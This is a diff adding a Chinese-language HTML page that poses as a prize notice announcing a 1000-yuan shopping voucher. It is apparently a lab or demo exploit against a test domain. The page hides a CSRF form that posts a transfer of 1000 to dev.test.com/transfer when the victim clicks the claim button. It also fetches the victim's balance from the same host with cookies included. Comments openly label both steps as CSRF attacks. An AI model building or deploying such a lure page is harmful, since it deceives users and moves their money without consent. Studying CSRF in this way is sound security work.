@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>免费抽奖</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #e74c3c;
+        }
+        .prize-image {
+            width: 200px;
+            margin: 20px 0;
+        }
+        .hidden-form {
+            display: none;
+        }
+        .balance-info {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 恭喜您中奖了！🎉</h1>
+        <img src="https://via.placeholder.com/200x200" alt="奖品图片" class="prize-image">
+        <p>您获得了价值1000元的购物券！</p>
+        <p>请点击下方按钮领取奖品：</p>
+        <button onclick="submitForm()">立即领取</button>
+
+        <!-- 添加余额显示区域 -->
+        <div class="balance-info">
+            <h3>您的账户信息</h3>
+            <p>当前余额：<span id="balance">加载中...</span></p>
+        </div>
+    </div>
+
+    <!-- 隐藏的CSRF表单 -->
+    <form id="csrf-form" class="hidden-form" action="http://dev.test.com/transfer" method="POST">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+
+    <script>
+        function submitForm() {
+            document.getElementById('csrf-form').submit();
+        }
+        // 添加GET请求的CSRF攻击
+        fetch('http://dev.test.com/balance', {
+            method: 'GET',
+            credentials: 'include'  // 包含cookies
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('balance').textContent = `¥ ${data.balance}`;
+        })
+        .catch(error => {
+            document.getElementById('balance').textContent = '获取失败';
+            console.error('Error:', error);
+        });
+    </script>
+</body>
+</html> 
